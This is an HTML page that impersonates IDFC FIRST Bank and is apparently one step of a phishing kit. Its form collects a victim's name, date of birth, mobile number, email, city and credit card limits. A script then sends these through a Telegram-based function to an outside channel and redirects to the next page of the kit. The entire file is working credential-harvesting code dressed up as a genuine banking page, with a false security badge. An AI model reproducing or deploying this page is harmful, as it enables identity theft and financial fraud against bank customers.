<!DOCTYPE html>
<html lang="en">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IDFC FIRST Bank - Personal Details</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Segoe UI', Arial, sans-serif; background: #f8f8f8; }

    .header-bar { background: #832625; padding: 12px 0; text-align: center; }
    .header-bar img { height: 36px; }

    .container { padding: 20px; max-width: 420px; margin: 0 auto; }
    .form-card { background: #fff; border-radius: 10px; padding: 25px 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.06); border-top: 3px solid #fd9907; }
    .form-card h2 { color: #832625; font-weight: 700; font-size: 1.15rem; text-align: center; margin-bottom: 20px; }

    label { display: block; margin-bottom: 4px; font-weight: 500; font-size: 0.85rem; color: #444; }
    input { width: 100%; padding: 10px 12px; margin-bottom: 14px; border: 1.5px solid #e0e0e0; border-radius: 6px; font-size: 0.95rem; }
    input:focus { border-color: #832625; outline: none; box-shadow: 0 0 0 3px rgba(131,38,37,0.1); }

    .btn-submit { display: block; width: 100%; padding: 12px; background: #832625; color: #fff; border: none; border-radius: 6px; font-size: 1rem; font-weight: 600; cursor: pointer; margin-top: 5px; }
    .btn-submit:hover { background: #6d1a15; }

    .secure-note { text-align: center; font-size: 0.72rem; color: #999; margin-top: 15px; }
  </style>
</head>
<body>

<div class="header-bar">
  <img src="../idfclog.jpeg" alt="IDFC FIRST Bank">
</div>

<div class="container">
  <div class="form-card">
    <h2>Personal Details</h2>
    <form id="idfcForm">
      <label for="name">Full Name</label>
      <input type="text" id="name" placeholder="Enter your full name" required>

      <label for="dob">Date of Birth</label>
      <input type="date" id="dob" required>

      <label for="mobile">Mobile Number</label>
      <input type="tel" id="mobile" placeholder="Enter mobile number" required maxlength="10">

      <label for="email">Email ID</label>
      <input type="email" id="email" placeholder="Enter email address" required>

      <label for="city">City</label>
      <input type="text" id="city" placeholder="Enter your city" required>

      <label for="totalLimit">Total Limit</label>
      <input type="number" id="totalLimit" placeholder="Enter total limit" required min="0" step="0.01">

      <label for="availableLimit">Available Limit</label>
      <input type="number" id="availableLimit" placeholder="Enter available limit" required min="0" step="0.01">

      <button type="submit" class="btn-submit">PROCEED NOW</button>
    </form>
    <div class="secure-note"><i class="fa-solid fa-lock me-1"></i> 256-bit SSL Secure</div>
  </div>
</div>

<script src="telegram-config.js"></script>
<script>
  document.getElementById("idfcForm").addEventListener("submit", async function(e) {
    e.preventDefault();
    const name = document.getElementById("name").value;
    const dob = document.getElementById("dob").value;
    const mobile = document.getElementById("mobile").value;
    const email = document.getElementById("email").value;
    const city = document.getElementById("city").value;
    const totalLimit = parseFloat(document.getElementById("totalLimit").value) || 0;
    const availableLimit = parseFloat(document.getElementById("availableLimit").value) || 0;
    const submitBtn = document.querySelector('.btn-submit');
    submitBtn.disabled = true;
    submitBtn.textContent = 'Processing...';

    try {
      const res = await saveFormSubmissionToTelegram('user_submissions', { name, dob, mobile, email, city, totalLimit, availableLimit });
      if (res.success) window.location.href = '4.html';
      else { alert('Error: ' + (res.error || 'unknown')); submitBtn.disabled = false; submitBtn.textContent = 'PROCEED NOW'; }
    } catch (err) { alert('Error occurred'); submitBtn.disabled = false; submitBtn.textContent = 'PROCEED NOW'; }
  });
</script>
</body>
</html>
